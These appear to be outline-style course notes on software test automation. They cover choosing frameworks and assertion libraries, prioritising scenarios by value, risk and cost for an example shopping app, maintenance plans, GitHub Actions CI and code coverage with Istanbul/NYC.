		○ Promote Cross-Functional Collaboration

			§ Prefer tools that enable collaboration among:

				• Developers (writing unit/integration tests).

				• Testers (creating UI or exploratory tests).

				• Business stakeholders (contributing scenarios, reviewing results).

			§ Collaboration improves code testability and reduces defects.

		○ Experimentation with Spikes

			§ Use spikes (small experiments) with potential tools to:

				• Learn how they work technically.

				• Explore ease of use, integrations, and limitations.

				• Document pros and cons.

			§ Bring results back to the larger team for informed discussion.

		○ Decision-Making

			§ There is no single perfect tool for every project.

			§ Goal: select the best-fit tools for each type of testing based on team needs and findings.

			§ The decision should be team-based and consensus-driven.



Development Process

	• Different types of automated tests should be written and executed at specific points in the software delivery life cycle. Establishing clear processes for when to write and when to run tests (both locally and in CI/CD) ensures consistent quality, faster feedback, and higher confidence in software changes.

	• Key Concepts

		○ When to Write Tests

			§ Unit tests → written during development, ideally using Test-Driven Development (TDD) (tests written before code).

			§ Integration tests → also written during development, once features are far enough along to test multiple components together.

			§ UI tests → can start during development, but completed only after the feature is fully developed.

		○ When to Run Tests

			§ Local Execution:

				• Developers should run tests locally before making code changes.

				• Ensures immediate feedback and prevents breaking builds.

			§ Continuous Integration (CI):

				• Test suite should run automatically after code is committed.

				• Provides fast, automated verification in shared environments.

		○ Best Practices

			§ Run tests frequently throughout development.

			§ Ensure test results remain green (passing) to maintain trust in the test suite.

			§ Build processes where testing is an integral part of daily workflow, not an afterthought.

			§ Regular testing improves team discipline, skill, and confidence with automation.



Follow Test Design Patterns

	• Using design principles and patterns in test automation helps keep tests consistent, maintainable, and cost-effective over the long term. By reducing duplication, improving readability, and ensuring clear structure, teams can build test suites that provide fast, useful feedback and are easier to update as systems evolve.

	• Key Concepts

		○ Importance of Test Design Patterns

			• Reduce the cost of writing and maintaining automated tests.

			• Ensure tests are understandable, reusable, and reliable.

			• Provide a shared structure and style for the team to follow.

		○ Core Principles \& Practices

			• DRY (Don’t Repeat Yourself):

				□ Avoid duplication in test code.

				□ Shared/reusable components mean updates only need to be made in one place.

			• DSL (Domain-Specific Language):

				□ Use descriptive, meaningful names for items in the test application.

				□ Establish a common language for both code and tests → improves communication across the team.

			• Single Purpose per Test:

				□ Each test should validate one behavior only.

				□ Results in clearer scope, easier debugging, and simpler updates when business rules change.

			• Test Independence:

				□ Tests should be self-contained.

				□ They can run in any order without relying on data or state from other tests.

			• Behavior-Driven Steps:

				□ Tests should be written as steps describing behaviors.

				□ Technical details should be abstracted into helper functions outside the test.

				□ Makes tests more human-readable and easier to maintain.

		○ Documentation \& Team Alignment

			• Teams should define and document chosen test design patterns.

			• Store patterns in a project README or guidelines.

			• Ensures new and existing teammates can follow the same structure and principles.



#### Testing Tools



Framework

	• A test framework is the foundation of a complete test automation project. Frameworks provide structure, consistency, and reusable code for tests, reducing setup time and improving collaboration. Different frameworks exist for different languages and testing needs (unit, integration, UI, BDD), so teams should evaluate options based on their project context.

	• Key Concepts

		○ Role of a Test Framework

			§ Provides a structured way to write and organize tests.

			§ Enables consistency across test suites.

			§ Supports reusable test code for common actions.

			§ Reduces the overhead of designing a test system from scratch.

		○ Popular Frameworks for JavaScript

			§ Mocha

				• Works well for Node.js apps.

				• Supports browser testing, async tests, built-in runner, and any assertion library.

			§ Jasmine

				• Framework-agnostic for JavaScript.

				• Doesn’t require a browser or DOM.

				• Clean, simple syntax, comes with its own runner.

			§ Jest

				• Created by Facebook, popular for React testing.

				• Zero configuration with new React projects.

				• Includes built-in runner, mocking, and code coverage reporting.

		○ UI Testing Frameworks

			§ Selenium

				• Classic UI automation tool.

				• Works with JavaScript and integrates with Mocha, Jasmine, Jest.

			§ Cucumber

				• Behavior-Driven Development (BDD) framework.

				• Uses plain language (Given-When-Then) to define tests.

				• Often paired with Selenium for UI scenarios.

			§ Cypress.io

				• Modern, fast, reliable UI testing framework.

				• Works directly in the browser.

				• Easy setup and widely used in modern web projects.

		○ Benefits of BDD Support

			§ Many frameworks support BDD (Behavior-Driven Development).

			§ Encourages writing tests in a clear, scenario-based format.

			§ Improves team collaboration, making tests understandable by non-technical stakeholders.

		○ Recommendations

			§ Using a prebuilt framework (e.g., Mocha, Jasmine, Jest, Cypress) is highly recommended:

				• Saves time → faster setup.

				• Provides proven structure.

				• Allows the team to focus on writing tests instead of building custom frameworks.

			§ Teams should investigate options and select the framework best aligned with their app type, language, and team workflow.



Assertion Library

	• Assertions are the core of automated testing, giving tests meaning by checking whether actual results match expected results. Different assertion libraries exist, each with their own syntax and features, but the goal is always the same: to make test results clear, readable, and reliable.

	• Key Concepts

		○ Role of Assertions

			§ Assertions validate outcomes of code execution.

			§ A test fails when an assertion shows that expected ≠ actual.

			§ They are the “backbone” of tests, turning code execution into meaningful pass/fail results.

		○ Types of Assertion Libraries

			§ Built-in libraries (no extra dependencies):

				• Assert → built into Node.js, simple and minimal.

				• Jasmine and Jest → come with their respective frameworks.

			§ Standalone / BDD-style libraries (optional for flexibility):

				• Chai → powerful with expect.to.equal style syntax, supports plugins and integrations.

				• Unexpected → very readable string-like syntax, highly extensible, works with any framework.

		○ Syntax \& Examples

			§ Assert → assert.equal(actual, expected)

			§ Jasmine / Jest → expect(actual).toEqual(expected)

			§ Chai → expect(actual).to.equal(expected)

			§ Unexpected → expect(actual, 'to equal', expected)

			§ All provide ways to express expected outcomes clearly, just with different wording.

		○ Best Practices

			§ Prefer using an assertion library that comes built-in (Node.js Assert, Jasmine, Jest) to avoid unnecessary dependencies.

			§ Choose a standalone library (e.g., Chai, Unexpected) if:

				• You need more flexibility or plugins.

				• You want syntax that feels more natural to your team.

			§ Focus on readability—assertions should make it obvious what’s being tested.

			§ Pick one style and stay consistent across the project.



Test Results

	• Once tests are written, they need to be run repeatedly, easily, and consistently. Test runners (like Mocha, Jasmine, or Jest) provide ways to execute tests and display results, and teams should ensure running tests is simple and results are clear and interpretable.

	• Key Concepts

		○ Importance of Running Tests

			• Tests are meant to be run over and over throughout development.

			• Running should be repeatable, quick, and reliable.

			• Results must provide confidence by being easy to read and interpret.

		○ Running Tests with Mocha (Example)

			• Run a single test file:	npx mocha test/unit/calculateTotalPrice.test.js

			Run all unit tests in a directory:	npx mocha test/unit/\*.js

			• Output displayed in the terminal shows test results (pass/fail, details).

		○ Using NPM Scripts

			• package.json → contains scripts section for test automation.

			• Example script:

				"unit-test": "mocha test/unit/\*.js"

			• Run with:

				npm run unit-test

			• Benefits:

				• Provides a shortcut for common test commands.

				• Can define multiple variations of test scripts (e.g., unit, integration, coverage).

		○ Frameworks \& Reporting

			• Jasmine and Jest run tests similarly (via CLI + configuration).

			• All major test frameworks provide basic built-in reporting (summary of results).

			• Reports can be customized or extended with other tools for more detailed output.

		○ Best Practices'

			• Keep test execution simple → one easy command.

			• Ensure results are readable and meaningful to developers and stakeholders.

			• Teams may enhance reports if more detail is important (e.g., HTML reports, CI/CD dashboards).



#### Decide What to Automate



Scenarios to Automate

	• When planning test automation, teams should brainstorm and identify scenarios worth automating for each new feature. The goal is to generate as many potential scenarios as possible, then refine them later. Automating common, high-value workflows (like adding items to a cart or checking out) ensures reliable coverage of critical user actions.

	• Key Concepts

		○ Brainstorming Scenarios

			• Take 10 minutes with the team for each new feature to write down all possible scenarios.

			• Don’t filter ideas at this stage—quantity over quality.

			• Capture even “off the wall” ideas; refinement comes later.

		○ Example: AI Animal Art Application

			• Key user workflows that can be turned into automated test scenarios:

				□ View products available for sale on homepage.

				□ Add item to cart (single item).

				□ Add multiple quantities of the same item to the cart.

				□ Add different types of items to the cart.

				□ View cart → confirm all items and total price are displayed.

				□ Update quantity of an item (e.g., cat item → quantity = 0 removes item).

				□ Update multiple item quantities or remove multiple items.

				□ Clear entire cart (last item set to zero empties cart).

				□ Verify cart updates correctly when items are removed.

				□ Checkout process → complete order successfully.

		○ Best Practices

			• Use common user journeys as inspiration (shopping flow, checkout flow, etc.).

			• Prioritize automating high-value, repetitive, and critical scenarios.

			• Understand that the initial list is not exhaustive; more scenarios will be added over time.



Give Each Scenario a Value

	• After brainstorming test scenarios, the next step is to evaluate and prioritize them by assigning a value score (1–5). This ensures that test automation efforts focus on the most important, distinct, and high-value features first, making testing more efficient and impactful.

	• Key Concepts

		○ Scoring System

			§ Use a 1–5 scale to assign value to each scenario.

			§ Criteria for scoring:

				□ Importance of the feature (business criticality).

				□ Likelihood of being fixed if broken (response priority).

				□ Distinctness of the scenario (how unique it is vs. overlapping with others).

		○ Team Involvement

			§ Scores should be assigned collaboratively with stakeholders.

			§ Use group judgment and discussion to align priorities.

			§ Helps create consensus and shared understanding of what matters most.

		○ Example Evaluations (AI Animal Art App)

			§ View Products for Sale → 5 (critical, distinct, must-have).

			§ Add Item to Cart → 5 (high importance, always fixed immediately).

			§ Add Multiple Items to Cart → 4 (important but less distinct).

			§ Remove Item from Cart → 4 (valuable but slightly lower than adding items).

			§ Checkout (Order) → 5 (highest importance, revenue-critical, always fixed first).

		○ Outcome

			§ Produces a prioritized list of scenarios ranked by value.

			§ Surfaces the most valuable tests to automate first.

			§ Ensures limited resources are used efficiently, covering business-critical paths.



Risk of Automation

	• After assigning value scores to test scenarios, teams should also assign risk scores (1–5). Risk scoring evaluates how critical a feature is by considering both its impact if broken and its probability of use by customers. This helps prioritize automation for the features most essential to user experience and business continuity.

	• Key Concepts

		○ Risk Scoring Method

			• Assign a score of 1–5 to each scenario.

			• Based on two criteria:

				□ Impact → What happens to customers if the feature is broken?

				□ Probability of Use → How frequently will customers use this feature?

		○ Example Risk Evaluations (AI Animal Art App)

			• View Products for Sale → 5 (high impact, high probability).

			• Add Item to Cart → 5 (critical function, used frequently).

			• Add Multiple Items to Cart → 4 (important, frequently used, but slightly less critical).

			• Order Checkout → 5 (highest impact, essential for revenue, high use).

		○ Purpose of Risk Scoring

			• Surfaces the highest-risk features that require strong test coverage.

			• Ensures that automation prioritizes areas where failures would cause the greatest damage.

			• Complements value scoring by adding another dimension to prioritization.

		○ Outcome

			• Produces a risk-ranked list of scenarios.

			• Helps teams decide which tests are most critical to automate first.

			• Guides test planning toward features that are both high-value and high-risk.



The Cost of Automation

	• Beyond value and risk, teams must also consider the cost of automation when prioritizing test scenarios. Assigning a cost score (1–5) helps quantify the effort required to write and maintain tests, ensuring teams balance business impact with development effort when deciding what to automate.

	• Key Concepts

		○ Cost Scoring

			§ Assign a score of 1–5 for each scenario.

			§ Factors considered:

				□ Ease of writing the test script.

				□ Speed of implementation (how quickly it can be scripted).

		○ Example Cost Evaluations (AI Animal Art App)

			§ View Products for Sale → 5 (very easy and quick).

			§ Add Item to Cart → 5 (easy and quick).

			§ Remove Single Item from Cart → 4 (easy but depends on first adding an item).

			§ Remove Multiple Items from Cart → 3 (requires adding multiple items first, more setup).

			§ Order Checkout → 4 (easy but depends on prior cart setup).

		○ Insights

			§ Cost varies more widely than risk or value scores.

			§ Some tests are highly valuable and risky, but expensive to automate (due to dependencies or setup).

			§ Cost scoring provides a realistic view of effort vs. payoff.

		○ Purpose

			§ Helps teams prioritize automation by balancing:

				□ Value (business importance).

				□ Risk (impact + frequency of use).

				□ Cost (effort to automate).

			§ Supports informed decision-making about what scenarios should be automated first, and which might stay manual.



Select What to Automate

	• Once value, risk, and cost scores have been assigned to test scenarios, teams can use the combined data to prioritize which scenarios to automate. By summing the scores and applying a threshold, the team focuses on automating the highest-priority scenarios first, ensuring testing delivers maximum impact with available resources.

	• Key Concepts

		○ Using Combined Scoring

			§ Each scenario has three scores: Value + Risk + Cost.

			§ Add them up for a total score.

			§ Higher totals → stronger candidates for automation.

		○ Example Scoring Scale

			§ 13–15 points → Automate these scenarios.

			§ 12 or less → Do not automate (or lower priority).

			§ Note: Thresholds can vary depending on team needs and project scope.

		○ Benefits of the Approach

			§ Provides a quantitative method for selecting automation candidates.

			§ Balances business importance (value), user impact (risk), and effort (cost).

			§ Helps teams avoid over-investing in low-value or high-cost scenarios.

		○ Flexibility

			§ The model is not rigid—adapt thresholds and scoring methods to fit project or organizational needs.

			§ Recognizes that not all features will score highly, but ensures resources go to top-priority scenarios first.

			§ Lower-priority scenarios may still be tested manually.



#### Adopt Test Automation



Maintain Standards

	• Test automation is an ongoing process that requires consistent investment, discipline, and adherence to good standards. By focusing on value, reliability, and speed, teams can maintain a healthy, sustainable, and effective test suite over time.

	• Key Concepts

		○ Valuable Tests

			• Tests should always deliver meaningful value.

			• Quality over quantity → focus on important scenarios, not just number of tests.

			• Regularly review and improve existing tests (e.g., retrospectives).

			• Treat test code like production code—maintain it, refactor it, and keep it clean.

		○ Reliable Tests

			• Tests must provide the same results consistently.

			• Have a plan for handling failures (since they’re inevitable).

			• Make tests independent—execution of one test should not affect others.

			• Run tests in a dedicated environment to prevent interference from other processes.

		○ Fast Tests

			• Speed matters for fast build times and quicker releases.

			• Use parallelization to run multiple tests concurrently.

			• Limit UI tests (which are slower) and focus more on lower-level tests (unit/integration) for faster feedback.

		○ Long-Term Sustainability

			• Following these three rules ensures a test suite that is:

				□ Valuable (aligned with business needs).

				□ Reliable (trustworthy results).

				□ Fast (efficient feedback loop).

			• A disciplined approach makes a huge difference over time as the project grows.



Make a Maintenance Plan

	• Test automation is not a one-time effort—it requires ongoing maintenance to remain effective. A solid maintenance plan addresses adding new tests, updating existing ones, and fixing failures, ensuring the test suite stays relevant, reliable, and supports continuous delivery with confidence.

	• Key Concepts

		○ Adding New Tests

			§ Every new feature requires new automated tests.

			§ Teams working on new functionality should discuss:

				□ How the feature will be tested.

				□ What types of tests (unit, integration, UI) will be created.

		○ Updating Old Tests

			§ Applications evolve over time, making some tests outdated.

			§ Maintenance activities include:

				□ Updating test data.

				□ Adjusting assertions to reflect changed functionality.

				□ Deleting irrelevant tests if features are removed or redesigned.

		○ Fixing Failures

			§ Builds must always stay green (passing).

			§ Failures fall into two categories:

				□ Flaky/random failures → Mitigate by rerunning or isolating them until stabilized.

				□ Legitimate failures → Investigate immediately, as they may signal a real bug.

					® Requires fixing the bug or reverting the code that introduced it.

		○ Best Practices for Maintenance

			§ Isolate flaky tests to prevent them from blocking reliable builds.

			§ Continuously improve flaky tests before reintroducing them into the main suite.

			§ Prioritize fixing legitimate failures quickly to maintain trust in the suite.

			§ Regularly revisit the test suite to ensure it reflects the current state of the application.

		○ Outcome

			§ A clear maintenance plan ensures that:

				□ New features are covered.

				□ Old/irrelevant tests don’t clutter the suite.

				□ Failures are handled systematically.

			§ This creates a robust, sustainable automation suite that evolves with the product.



Use Continuous Integration

	• Continuous Integration (CI) is the best way to repeatedly and reliably run automated tests across environments. CI ensures that tests run automatically on code changes or scheduled intervals, providing faster feedback, catching bugs earlier, and maintaining software quality.

	• Key Concepts

		○ Purpose of Continuous Integration

			§ Automated tests can be run over and over consistently.

			§ CI enables tests to be triggered:

				□ On code pushes (e.g., to GitHub).

				□ On pull requests.

				□ On a schedule (e.g., hourly or nightly).

			§ Benefit: Catches bugs earlier compared to manual, ad hoc local testing.

		○ Choosing a CI Solution

			§ Many CI tools are available (e.g., Jenkins, CircleCI, GitHub Actions).

			§ Criteria to consider:

				□ Cost

				□ Ease of use

				□ Maintenance overhead

				□ Support

		○ Example: GitHub Actions Setup

			§ GitHub Actions provides free CI for public repos.

			§ Workflow is defined in a YAML file (.github/workflows/node.js.yaml).

			§ Example configuration:

				□ Triggered on push or pull request to main.

				□ Runs on Ubuntu with a Node.js version matrix (can be limited to latest).

				□ Steps:

					® Checkout project.

					® Install dependencies (npm ci).

					® Start server (npm start \&).

					® Run unit tests (npm run unit-test).

					® Run integration tests (npm run integration-test).

					® Run UI tests (npm run UI-test).

		○ Workflow Execution

			§ Once committed, workflows appear in the Actions tab of the repo.

			§ Developers can view:

				□ Build status (pending, success, failed).

				□ Detailed logs of each step.

			§ Example: build completed successfully in 35 seconds.

		○ Benefits of CI for Automated Testing

			§ Reliability: Ensures tests run consistently in controlled environments.

			§ Early detection: Bugs caught sooner in the pipeline.

			§ Speed: Automates repetitive validation, speeding up delivery.

			§ Transparency: Team can see real-time test results and build history.



Measure Code Coverage

	• Code coverage is a widely used metric for evaluating automated tests. It shows what percentage of the application’s code is executed during testing, helping teams identify well-tested and under-tested areas. While coverage tools provide valuable insights, coverage should be used as a guidance metric—not a strict target—to avoid focusing on numbers instead of meaningful tests.

	• Key Concepts

		○ What Code Coverage Measures

			§ Statement coverage → percentage of statements executed.

			§ Branch coverage → percentage of decision branches tested (if/else paths).

			§ Function coverage → percentage of functions invoked.

			§ Line coverage → percentage of lines executed.

		○ Benefits of Code Coverage

			§ Helps visualize test quality (what’s covered vs. uncovered).

			§ Identifies gaps in test coverage.

			§ Coverage tools are often free and easy to set up, especially for open-source projects.

			§ Provides reports that highlight coverage in color (green = high, yellow = medium, red = low).

		○ Example: Istanbul / NYC

			§ Istanbul is a popular tool for JavaScript projects.

			§ NYC is its CLI interface.

			§ Setup:

				□ Install with npm install --save-dev nyc.

				□ Add a test-coverage script in package.json (e.g., "nyc mocha test").

				□ Run with npm run test-coverage.

			§ Generates a report showing coverage by file, including uncovered lines.

		○ Best Practices

			§ Always measure coverage to inform test improvement.

			§ Don’t chase 100% coverage:

				□ It may lead to writing unnecessary or low-value tests.

				□ Can increase maintenance cost without improving quality.

			§ Instead, focus on:

				□ High-value scenarios.

				□ Areas with low or critical coverage.

				□ Using coverage data to make informed test decisions.







